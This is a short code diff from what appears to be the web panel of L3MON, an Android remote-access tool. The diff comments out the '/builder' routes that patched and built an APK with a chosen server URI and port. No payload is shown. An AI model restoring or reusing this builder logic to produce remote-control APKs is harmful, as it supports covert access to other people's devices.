@@ -58,34 +58,34 @@ routes.get('/logout', isAllowed, (req, res) => {
 });
 
 
-routes.get('/builder', isAllowed, (req, res) => {
-    res.render('l3mon/builder', {
-        myPort: CONST.control_port
-    });
-});
+// routes.get('/builder', isAllowed, (req, res) => {
+//     res.render('l3mon/builder', {
+//         myPort: CONST.control_port
+//     });
+// });
 
-routes.post('/builder', isAllowed, (req, res) => {
-    if ((req.query.uri !== undefined) && (req.query.port !== undefined)) apkBuilder.patchAPK(req.query.uri, req.query.port, (error) => {
-        if (!error) apkBuilder.buildAPK((error) => {
-            if (!error) {
-                logManager.log(CONST.logTypes.success, "Build Succeded!");
-                res.json({ error: false });
-            }
-            else {
-                logManager.log(CONST.logTypes.error, "Build Failed - " + error);
-                res.json({ error });
-            }
-        });
-        else {
-            logManager.log(CONST.logTypes.error, "Build Failed - " + error);
-            res.json({ error });
-        }
-    });
-    else {
-        logManager.log(CONST.logTypes.error, "Build Failed - " + error);
-        res.json({ error });
-    }
-});
+// routes.post('/builder', isAllowed, (req, res) => {
+//     if ((req.query.uri !== undefined) && (req.query.port !== undefined)) apkBuilder.patchAPK(req.query.uri, req.query.port, (error) => {
+//         if (!error) apkBuilder.buildAPK((error) => {
+//             if (!error) {
+//                 logManager.log(CONST.logTypes.success, "Build Succeded!");
+//                 res.json({ error: false });
+//             }
+//             else {
+//                 logManager.log(CONST.logTypes.error, "Build Failed - " + error);
+//                 res.json({ error });
+//             }
+//         });
+//         else {
+//             logManager.log(CONST.logTypes.error, "Build Failed - " + error);
+//             res.json({ error });
+//         }
+//     });
+//     else {
+//         logManager.log(CONST.logTypes.error, "Build Failed - " + error);
+//         res.json({ error });
+//     }
+// });
 
 
 routes.get('/logs', isAllowed, (req, res) => {
